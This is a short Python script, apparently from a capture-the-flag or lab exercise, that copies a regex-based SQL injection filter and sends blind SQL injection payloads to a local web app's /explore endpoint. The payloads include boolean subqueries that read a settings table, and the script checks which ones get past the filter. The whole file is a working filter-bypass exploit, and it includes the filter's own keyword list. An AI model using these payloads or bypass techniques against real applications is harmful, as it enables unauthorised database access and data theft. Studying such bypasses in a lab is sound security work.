import re, requests

BASE = "http://localhost:5000"

# Reproduce WAF locally
_SQLI_PATTERNS = [
    r"--", r"#", r"/\*", r"\*/",
    r"\bUNION\b", r"\bOR\s", r"\bAND\s+\d",
    r"\bDROP\b", r"\bDELETE\b", r"\bINSERT\b", r"\bUPDATE\b",
    r"\bEXEC\b", r"\bSLEEP\b", r"\bBENCHMARK\b",
    r"\bLOAD_FILE\b", r"\bINTO\s+OUTFILE\b", r"\bATTACH\b",
]
_SQLI_RE = re.compile("|".join(_SQLI_PATTERNS), re.IGNORECASE)

def waf_check(v):
    return _SQLI_RE.sub("", v)

tests = {
    "subquery literal":
        "%' AND (SELECT 1)='1' AND '1%'='1",
    "subquery literal int cmp":
        "%' AND (SELECT 1)=1 AND '1%'='1",
    "subquery from settings":
        "%' AND (SELECT val FROM settings WHERE key='motd') LIKE '%Welcome%' AND '1%'='1",
    "CASE no subquery":
        "%' AND CASE WHEN (1=1) THEN '1' ELSE '0' END='1' AND '1%'='1",
    "no-space AND":
        "%' AND(SELECT 1)='1' AND '1%'='1",
}

for name, payload in tests.items():
    cleaned = waf_check(payload)
    changed = "MODIFIED" if cleaned != payload else "unchanged"
    r = requests.get(f"{BASE}/explore", params={"q": payload})
    has = "Hello World" in r.text
    print(f"[{name}]  waf={changed}  status={r.status_code}  marker={has}")
    if changed == "MODIFIED":
        print(f"   original: {payload[:80]}")
        print(f"   cleaned:  {cleaned[:80]}")
